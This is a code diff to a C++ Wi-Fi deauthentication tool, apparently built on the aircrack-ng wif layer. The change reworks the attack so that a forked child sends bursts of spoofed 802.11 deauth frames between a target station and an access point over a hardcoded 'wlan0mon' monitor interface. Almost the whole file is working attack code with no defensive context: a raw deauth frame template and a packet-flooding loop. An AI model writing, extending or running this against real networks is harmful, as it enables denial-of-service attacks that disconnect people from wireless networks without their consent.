@@ -3,17 +3,22 @@
 #include <wif.h>
 #include <pcap.h>
 
+#include <iostream>
+
 #include <cstring>
 #include <cstdlib>
 #include <cstdio>
 #include <cassert>
 
+
 #include <sys/types.h>
 #include <unistd.h>
 #include <errno.h>
+#include <sys/wait.h>
 
 #define DEAUTH_REQ "\xC0\x00\x3A\x01\xCC\xCC\xCC\xCC\xCC\xCC\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\x00\x00\x07\x00"
 
+static inline int send_packet(struct wif * wi, void * buf, size_t count);
 
 Deauth::Deauth(uint8_t const * bssid_in, char const * iface_in)
   : iface{iface_in} {
@@ -23,18 +28,73 @@ Deauth::Deauth(uint8_t const * bssid_in, char const * iface_in)
 int Deauth::SendPacket(uint8_t const * stmac_in) {
   assert(stmac_in);
 
-  stmac = stmac_in;
+  pid_t pid = fork();
+  if (!pid) {
+    // char i[65];
+    uint8_t st[6];
+    uint8_t bs[6];
+    memcpy(st, stmac_in, 6);
+    memcpy(bs, bssid, 6);
+    sendP("wlan0mon", bs, st);
+    exit(0);
+  }
+  waitpid(pid, NULL, 0);
 
+  return 0;
+}
+
+void sendP(char const * iface, uint8_t const * bssid_in, uint8_t const * stmac_in) {
+  printf("%s\n", iface);
+  assert(stmac_in);
+
+  
+  for (int i = 0; i != 5; ++i)
+    printf("%02x:", bssid_in[i]);
+  printf("%02x\n", bssid_in[5]);
+  for (int i = 0; i != 5; ++i)
+    printf("%02x:", stmac_in[i]);
+  printf("%02x\n", stmac_in[5]);
 		/* open the replay interface */
+  // return;
   wif *wi = wi_open(iface);
-  if (!wi) return 1;
-  int fd_out = wi->wi_fd(wi);
+  if (!wi) {
+    perror("wi:");
+    return;
+  }
 
 	/* drop privileges */
 	if (setuid(getuid()) == -1)
 		perror("setuid");
+  uint8_t h80211[4096] {0};
+  for (int i = 0; i != 2; ++i) {
+    usleep(180000);
 
-  return do_attack_deauth(wi);
+    /* deauthenticate the target */
+    memcpy(h80211, DEAUTH_REQ, 26);
+    memcpy(h80211 + 16, bssid_in, 6);
+
+    /* add the deauth reason code */
+    h80211[24] = 7;
+
+    for (int j = 0; j != 32; ++j) {
+
+      memcpy(h80211 + 4, stmac_in, 6);
+      memcpy(h80211 + 10, bssid_in, 6);
+
+      if (send_packet(wi, h80211, 26) < 0)
+        return ;
+
+      usleep(2000);
+
+      memcpy(h80211 + 4, bssid_in, 6);
+      memcpy(h80211 + 10, stmac_in, 6);
+
+      if (send_packet(wi, h80211, 26) < 0)
+        return ;
+
+      usleep(2000);
+    }
+  }
 
 }
 
@@ -72,37 +132,37 @@ static inline int send_packet(struct wif * wi, void * buf, size_t count) {
 	return (0);
 }
 
-int Deauth::do_attack_deauth(wif * wi) {
-  for (int i = 0; i != 2; ++i) {
+// int Deauth::do_attack_deauth(wif * wi) {
+//   for (int i = 0; i != 2; ++i) {
 
-		usleep(180000);
+// 		usleep(180000);
 
-    /* deauthenticate the target */
-    memcpy(h80211, DEAUTH_REQ, 26);
-    memcpy(h80211 + 16, bssid, 6);
+//     /* deauthenticate the target */
+//     memcpy(h80211, DEAUTH_REQ, 26);
+//     memcpy(h80211 + 16, bssid, 6);
 
-    /* add the deauth reason code */
-    h80211[24] = 7;
+//     /* add the deauth reason code */
+//     h80211[24] = 7;
 
-    for (int j = 0; j != 32; ++j) {
+//     for (int j = 0; j != 32; ++j) {
 
-      memcpy(h80211 + 4, stmac, 6);
-      memcpy(h80211 + 10, bssid, 6);
+//       memcpy(h80211 + 4, stmac, 6);
+//       memcpy(h80211 + 10, bssid, 6);
 
-      if (send_packet(wi, h80211, 26) < 0)
-        return 1;
+//       if (send_packet(wi, h80211, 26) < 0)
+//         return 1;
 
-      usleep(2000);
+//       usleep(2000);
 
-      memcpy(h80211 + 4, bssid, 6);
-      memcpy(h80211 + 10, stmac, 6);
+//       memcpy(h80211 + 4, bssid, 6);
+//       memcpy(h80211 + 10, stmac, 6);
 
-      if (send_packet(wi, h80211, 26) < 0)
-        return 1;
+//       if (send_packet(wi, h80211, 26) < 0)
+//         return 1;
 
-      usleep(2000);
-    }
-  }
-	return 0;
-}
+//       usleep(2000);
+//     }
+//   }
+// 	return 0;
+// }
 
